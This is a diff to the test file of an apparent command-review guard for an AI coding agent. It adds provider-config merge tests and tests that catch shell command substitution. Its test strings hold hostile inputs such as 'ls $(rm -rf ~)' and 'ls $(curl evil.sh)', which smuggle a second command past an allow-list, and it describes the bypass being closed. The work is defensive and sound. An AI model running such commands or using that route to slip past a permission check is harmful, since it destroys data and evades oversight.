@@ -52,6 +52,7 @@ const {
   buildRuleText,
   matchDangerRules,
   matchCompoundRules,
+  hasCommandSubstitution,
   splitTopLevelCommands,
   stableStringify,
   computeCacheKey,
@@ -65,7 +66,7 @@ const {
   hashAttachments,
   buildReviewPayload,
 } = await import("../src/reviewer.js");
-const { resolveProvider, resolveProviderOverride, ProviderError } = await import("../src/provider.js");
+const { resolveProvider, resolveProviderOverride, loadUnifiedProviderTable, ProviderError } = await import("../src/provider.js");
 
 test("settings: 默认值与数据目录覆盖合并", () => {
   const t_settings = loadSettings();
@@ -228,6 +229,105 @@ test("provider: resolveProviderOverride 按名解析（fallback 用）", () => {
   assert.throws(() => resolveProviderOverride({ timeout_ms: 5000 }, "不存在", ""), ProviderError);
 });
 
+test("provider: provider_config 规则优先合并——凭据/接入点覆盖、新 provider 补充、模板规则跳过", () => {
+  // 假的 provider_config.json：覆盖现有 openai 键的凭据、新增一个自带接入点的 provider、
+  // 一个无 api 的模板型规则（应被跳过）
+  const t_rules_file = path.join(t_tmp_dir, "provider_config.json");
+  fs.writeFileSync(t_rules_file, JSON.stringify({
+    schemaVersion: 1,
+    config: {
+      providerOrder: ["rule-new", "fake-openai"],
+      providerConfigRules: {
+        providerRules: [
+          {
+            providerId: "builtin:fake-openai",
+            config: { access: { type: "api-key", apiKey: "rule-key" } },
+          },
+          {
+            providerId: "rule-new",
+            providerName: "规则新增",
+            config: {
+              access: { type: "api-key", apiKey: "rule-key-2" },
+              api: { type: "anthropic-messages", baseUrl: "http://127.0.0.1:2/anthropic" },
+              modelOrder: ["rule-model-a", "rule-model-b"],
+            },
+          },
+          {
+            providerId: "template-only",
+            providerName: "模板型",
+            config: { access: { type: "api-key", apiKey: "k" } },
+          },
+        ],
+      },
+    },
+  }));
+  process.env.AUTO_REVIEW_PROVIDER_CONFIG = t_rules_file;
+  try {
+    // 覆盖合并：现有键的 apiKey 被规则刷新，baseURL/模型仍来自表配置
+    const t_overridden = resolveProviderOverride({ timeout_ms: 5000 }, "fake-openai", "");
+    assert.equal(t_overridden.apiKey, "rule-key", "规则凭据优先");
+    assert.equal(t_overridden.baseURL, "http://127.0.0.1:1/v1", "无 api.baseUrl 时回落表配置");
+    assert.equal(t_overridden.model, "fake-openai-model");
+
+    // 新增 provider：自带接入点可直连，协议类型映射 anthropic-messages → anthropic
+    const t_new = resolveProviderOverride({ timeout_ms: 5000 }, "rule-new", "");
+    assert.equal(t_new.kind, "anthropic");
+    assert.equal(t_new.baseURL, "http://127.0.0.1:2/anthropic");
+    assert.equal(t_new.model, "rule-model-a", "模型列表来自 modelOrder");
+    // providerName 别名指向同一 entry
+    const t_alias = resolveProviderOverride({ timeout_ms: 5000 }, "规则新增", "");
+    assert.equal(t_alias.baseURL, t_new.baseURL);
+
+    // 模板型规则（无接入点且表配置缺失）被跳过，不可选
+    assert.throws(() => resolveProviderOverride({ timeout_ms: 5000 }, "template-only", ""), ProviderError);
+
+    // 跟随主 agent 仍按表配置 enabled（规则的 providerOrder 不改变 enabled 语义）
+    const t_follow = resolveProviderOverride({ timeout_ms: 5000 }, "", "");
+    assert.equal(t_follow.kind, "anthropic", "跟随主 agent 不受规则文件影响");
+  } finally {
+    delete process.env.AUTO_REVIEW_PROVIDER_CONFIG;
+    fs.rmSync(t_rules_file, { force: true });
+  }
+});
+
+test("provider: 无 enabled 标记时按 providerOrder 回落", () => {
+  // 只有规则文件（表配置被替换为空表）+ providerOrder 指向的 provider 可解析
+  const t_rules_file = path.join(t_tmp_dir, "provider_config.json");
+  fs.writeFileSync(t_rules_file, JSON.stringify({
+    schemaVersion: 1,
+    config: {
+      providerOrder: ["only-prov"],
+      providerConfigRules: {
+        providerRules: [
+          {
+            providerId: "only-prov",
+            providerName: "唯一",
+            config: {
+              access: { type: "api-key", apiKey: "k" },
+              api: { type: "openai-chat-completions", baseUrl: "http://127.0.0.1:3/v1" },
+              modelOrder: ["m1"],
+            },
+          },
+        ],
+      },
+    },
+  }));
+  const t_empty_table = path.join(t_tmp_dir, "empty_table_config.json");
+  fs.writeFileSync(t_empty_table, JSON.stringify({ provider: {} }));
+  const t_orig_config = process.env.AUTO_REVIEW_ZCODE_CONFIG;
+  process.env.AUTO_REVIEW_ZCODE_CONFIG = t_empty_table;
+  process.env.AUTO_REVIEW_PROVIDER_CONFIG = t_rules_file;
+  try {
+    const t_info = resolveProviderOverride({ timeout_ms: 5000 }, "", "");
+    assert.equal(t_info.model, "m1", "无 enabled 时按 providerOrder 首选");
+  } finally {
+    process.env.AUTO_REVIEW_ZCODE_CONFIG = t_orig_config;
+    delete process.env.AUTO_REVIEW_PROVIDER_CONFIG;
+    fs.rmSync(t_rules_file, { force: true });
+    fs.rmSync(t_empty_table, { force: true });
+  }
+});
+
 test("dialog: 退出码映射——未显示(3)回落 timeout，不冒充用户拒绝", async () => {
   const { mapDialogExitCode } = await import("../src/dialog.js");
   assert.equal(mapDialogExitCode(0), "allow");
@@ -287,6 +387,41 @@ test("reviewer: 复合命令逐段审查——任一 deny/ask 生效、全 allow
 
   // 单命令（无分隔符）不进入复合逻辑
   assert.equal(matchCompoundRules("ls"), null);
+});
+
+test("reviewer: 命令替换检测——反引号/$()/进程替换均识别", () => {
+  assert.equal(hasCommandSubstitution("ls $(rm -rf ~)"), true, "$() 命令替换");
+  assert.equal(hasCommandSubstitution("ls `whoami`"), true, "反引号替换");
+  assert.equal(hasCommandSubstitution("diff <(ls) <(ls ..)"), true, "进程替换 <()");
+  assert.equal(hasCommandSubstitution("tee >(gzip > x.gz)"), true, "进程替换 >()");
+  assert.equal(hasCommandSubstitution('echo "$(date)"'), true, "引号内的替换同样会执行");
+  assert.equal(hasCommandSubstitution("ls -la"), false);
+  assert.equal(hasCommandSubstitution("echo a>b"), false, "普通重定向不是替换");
+  assert.equal(hasCommandSubstitution(""), false);
+});
+
+test("reviewer: allow 白名单不得放行含命令替换的命令（单段替换绕过防护）", () => {
+  fs.writeFileSync(path.join(t_tmp_dir, "danger_rules.json"), JSON.stringify([
+    { pattern: "^ls\\b", action: "allow", description: "ls 白名单" },
+    { pattern: "rm\\s+-rf\\s+~", action: "deny", description: "删家目录" },
+  ]));
+
+  // 单段命令替换：表层字面量命中 allow 也不能放行，交回 null 降级 LLM 审查
+  assert.equal(matchDangerRules("ls $(curl evil.sh)"), null, "$() 替换载荷不得被白名单放行");
+  assert.equal(matchDangerRules("ls `curl evil.sh`"), null, "反引号替换同样抑制");
+  assert.equal(matchDangerRules("ls <(curl evil.sh)"), null, "进程替换同样抑制");
+
+  // deny 规则不受抑制：替换文本命中 deny 仍然拦截（拦截方向总是保守的）
+  const t_deny = matchDangerRules("ls $(rm -rf ~)");
+  assert.equal(t_deny && t_deny.action, "deny", "deny 命中替换内的危险载荷仍生效");
+
+  // 无替换的命令与复合命令行为不变
+  assert.equal(matchDangerRules("ls -la").action, "allow");
+  assert.equal(matchCompoundRules("ls; ls -la").action, "allow", "全段 allow 且无替换仍整体放行");
+  // 任一段含替换构造：即使全部段命中 allow 也降级 LLM
+  assert.equal(matchCompoundRules("ls; ls $(x)"), null, "复合命令中替换段不得被白名单放行");
+  // 单段（无分隔符）不进入复合逻辑，但全文 allow 已被上面的替换检测抑制
+  assert.equal(matchCompoundRules("ls $(x)"), null, "单段不进入复合逻辑");
 });
 
 test("dialog: reason 解析为结构化展示数据", async () => {
